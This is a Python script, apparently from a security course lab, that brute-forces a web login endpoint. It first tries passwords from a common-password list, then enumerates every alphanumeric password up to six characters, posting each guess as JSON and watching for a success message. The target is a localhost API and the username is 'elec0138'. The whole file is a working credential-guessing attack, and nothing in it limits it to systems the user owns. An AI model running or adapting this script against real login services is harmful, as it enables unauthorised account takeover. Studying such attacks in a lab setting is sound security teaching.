import requests
import time
import itertools
import string


def brute_force_attack(username, login_url, max_length=6, verbose=False):
    start_time = time.time()

    # 10000 most common passwords taken from https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
    common_pwd_path = "password-top1000.txt"
    with open(common_pwd_path, "r") as file:
        passwords = file.read().splitlines()

    print("trying common passwords...")
    for password in passwords:
        if try_password(username, login_url, password, verbose):
            print_timing(start_time)
            return
    print_timing(start_time)

    chars = (
        string.ascii_letters + string.digits
    )  # abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

    print("trying all possible passwords...")
    for length in range(1, max_length + 1):
        for pwd_tuple in itertools.product(chars, repeat=length):
            password = "".join(pwd_tuple)
            if try_password(username, login_url, password, verbose):
                print_timing(start_time)
                return

    print("Failed to find the password within the given length.")
    print_timing(start_time)


def try_password(username, login_url, password, verbose=False):
    login_data = {"username": username, "password": password}
    if verbose:
        print(f"Trying password: {password}")
    response = requests.post(login_url, json=login_data)
    if "User logged in successfully" in response.text:
        print(f"Found correct password: {password}")
        return True
    return False


def print_timing(start_time):
    end_time = time.time()
    print(f"Time taken: {end_time - start_time} seconds")


if __name__ == "__main__":
    brute_force_attack(
        username="elec0138",
        login_url="http://127.0.0.1:5000/api/v1/login",
        verbose=True,
    )
